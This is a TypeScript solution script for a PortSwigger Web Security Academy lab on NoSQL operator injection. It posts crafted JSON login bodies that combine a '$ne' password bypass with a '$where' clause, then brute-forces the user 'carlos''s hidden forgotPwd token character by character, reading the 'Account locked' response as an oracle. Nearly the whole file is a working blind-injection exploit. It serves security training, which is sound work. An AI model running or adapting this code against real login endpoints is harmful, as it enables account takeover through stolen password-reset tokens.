/**
 * PortSwigger Lab: Exploiting NoSQL operator injection to extract unknown fields
 * https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-extract-unknown-fields
 */

import { Sess } from "../base"

const LABID = "0a8d003e03d6d0a783d074410068003d"

const iter = async (index: number, char: string) => {
	return await Sess.req`
		POST /login HTTP/2
		Host: ${LABID}.web-security-academy.net
		Content-Length: 90
		Sec-Ch-Ua: "Brave";v="119", "Chromium";v="119", "Not?A_Brand";v="24"
		Sec-Ch-Ua-Platform: "macOS"
		Sec-Ch-Ua-Mobile: ?0
		User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
		Content-Type: application/json
		Accept: */*
		Sec-Gpc: 1
		Accept-Language: en-GB,en;q=0.6
		Origin: https://${LABID}.web-security-academy.net
		Sec-Fetch-Site: same-origin
		Sec-Fetch-Mode: cors
		Sec-Fetch-Dest: empty
		Referer: https://${LABID}.web-security-academy.net/login
		Accept-Encoding: gzip, deflate, br
		
		{"username":"carlos","password":{"$ne":""},"$where":"this.forgotPwd[${index + ""}] == '${char}'"}
	`.then(r => r.body().includes("Account locked"))
}

let index = 0
let password = ""
const chars = "abcdefghijklmnopqrstuvwxyz0123456789".split("")

for (let i = 0; i < 50; i++) {
	let found = false
	for (const char of chars) {
		if (await iter(index, char)) {
			console.log(`SUCCESS CHAR ${index}: ${char}`)
			password += char
			found = true
			break
		}
	}

	if (found) {
		index++
	} else {
		console.log(`FAILURE CHAR ${index}`)
		break
	}
}

console.log(`forgotPwd: ${password}`)
